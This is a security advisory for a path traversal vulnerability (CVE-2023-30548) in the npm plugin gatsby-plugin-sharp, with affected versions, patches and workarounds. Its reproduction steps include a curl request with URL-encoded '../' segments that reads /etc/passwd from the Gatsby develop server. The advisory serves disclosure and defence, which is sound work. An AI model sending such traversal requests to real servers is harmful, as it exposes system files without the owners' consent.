# [M] Path traversal vulnerability in gatsby-plugin-sharp

## Summary
Severity: Medium
Advisory: GHSA-h2pm-378c-pcxx
CVE: CVE-2023-30548
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2023-04-20
Source: https://github.com/advisories/GHSA-h2pm-378c-pcxx
Type: github-advisory

## Affected
- npm: `gatsby-plugin-sharp` — affected >=5.0.0 <5.8.1
- npm: `gatsby-plugin-sharp` — affected >=0 <4.25.1

## Details
### Impact

The gatsby-plugin-sharp plugin prior to versions 5.8.1 and 4.25.1 contains a path traversal vulnerability exposed when running the Gatsby develop server (`gatsby develop`).

The following steps can be used to reproduce the vulnerability:

```
# Create a new Gatsby project, and install gatsby-plugin-sharp
$ npm init gatsby
$ cd my-gatsby-site
$ npm install gatsby-plugin-sharp


# Add the plugin to gatsby-config.js
module.exports = {
  plugins: [
    {
      resolve: `gatsby-plugin-sharp`,
    },
  ]
}

# Start the Gatsby develop server
$ gatsby develop

# Execute the path traversal vulnerability
$ curl "http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

It should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.


### Patches

A patch has been introduced in `gatsby-plugin-sharp@5.8.1` and `gatsby-plugin-sharp@4.25.1` which mitigates the issue by ensuring that included paths remain within the project directory.


### Workarounds

As stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.

We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.


### Credits

We would like to thank Patrick Rombouts and Bart Veneman [drukwerkdeal.nl] for bringing the issue to our attention.


### For more information

Email us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).

## References
- https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-h2pm-378c-pcxx
- https://nvd.nist.gov/vuln/detail/CVE-2023-30548
- https://github.com/gatsbyjs/gatsby/commit/5f442081b227cc0879babb96858f970c4ce94c6b
- https://github.com/gatsbyjs/gatsby/commit/dcf88ed01df2c26e0c93a41e1a2a840076d8247e
- https://github.com/gatsbyjs/gatsby
